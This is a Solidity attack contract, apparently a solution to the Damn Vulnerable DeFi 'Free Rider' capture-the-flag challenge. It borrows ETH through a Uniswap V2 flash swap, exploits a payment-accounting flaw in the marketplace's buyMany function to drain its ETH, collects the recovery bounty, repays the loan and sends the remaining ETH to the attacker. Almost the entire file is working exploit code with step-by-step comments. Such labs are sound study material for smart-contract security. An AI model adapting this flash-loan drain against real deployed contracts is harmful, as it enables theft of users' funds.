// interfaces that attack contract needs
interface IUniswapV2Pair {
  function token0() external view returns (address);
  function token1() external view returns (address);
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IWETH {
    function deposit() external payable;
    function transfer(address recipient, uint amount) external returns (bool);
    function withdraw(uint) external;
}

contract FreeRiderNFTMarketplaceAttack is IERC721Receiver {

    FreeRiderNFTMarketplace market;
    IUniswapV2Pair          uniswapV2Pair;
    address                 recoveryAddr;
    address                 playerAddr;
    uint256 constant        LOAN_AMOUNT = 31 ether;

    constructor(address payable _market, address _uniswapV2Pair, address _recoveryAddr, address _playerAddr) {
        market        = FreeRiderNFTMarketplace(_market);
        uniswapV2Pair = IUniswapV2Pair(_uniswapV2Pair);
        recoveryAddr  = _recoveryAddr;
        playerAddr    = _playerAddr;
    }

    // https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/IERC721Receiver.sol
    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function attack() external {
        // 1) Use UniswapV2 flash swap to get a flash loan for LOAN_AMOUNT
        // perform a flash swap (uniswapv2 version of flash loan)
        // https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps
        uniswapV2Pair.swap(LOAN_AMOUNT, 0, address(this), hex"00");
    }

    // uniswapv2 flash swap will call this function
    function uniswapV2Call(address, uint, uint, bytes calldata) external {
        IWETH weth = IWETH(uniswapV2Pair.token0());

        weth.withdraw(LOAN_AMOUNT);

        // 2) Buy 6 nfts for 15 ether => Market will have 90+15-(6*15) = 15 ether left
        uint256[] memory nftIds = new uint256[](6);
        for(uint8 i=0; i<6;) {
            nftIds[i] = i;
            ++i;
        }

        market.buyMany{value: 15 ether}(nftIds);

        // 3) Offer 2 nfts for 15 ether each : Market has 15 ether left
        market.token().setApprovalForAll(address(market), true);
        uint256[] memory nftIds2 = new uint256[](2);
        uint256[] memory prices  = new uint256[](2);
        for(uint8 i=0; i<2;) {
            nftIds2[i] = i;
            prices[i]  = 15 ether;
            ++i;        
        }

        market.offerMany(nftIds2, prices);

        // 4) Buy them both for 15 ether => Market will have 15+15-(2*15) = 0 ether left
        market.buyMany{value: 15 ether}(nftIds2);

        // forward bought nfts to recovery address to receive eth reward
        // must include player/attacker address as bytes memory data parameter
        // since FreeRiderRecovery.onERC721Received() will decode this
        // and send reward to it
        DamnValuableNFT nft = DamnValuableNFT(market.token());
        for (uint8 i=0; i<6;) {
            nft.safeTransferFrom(address(this), recoveryAddr, i, abi.encode(playerAddr));
            ++i;
        }

        // calculate fee and repay loan.
        uint256 fee = ((LOAN_AMOUNT * 3) / uint256(997)) + 1;
        weth.deposit{value: LOAN_AMOUNT + fee}();
        weth.transfer(address(uniswapV2Pair), LOAN_AMOUNT + fee);

        // forward eth stolen from market to attacker
        payable(playerAddr).transfer(address(this).balance);
    }

    receive() external payable {}
}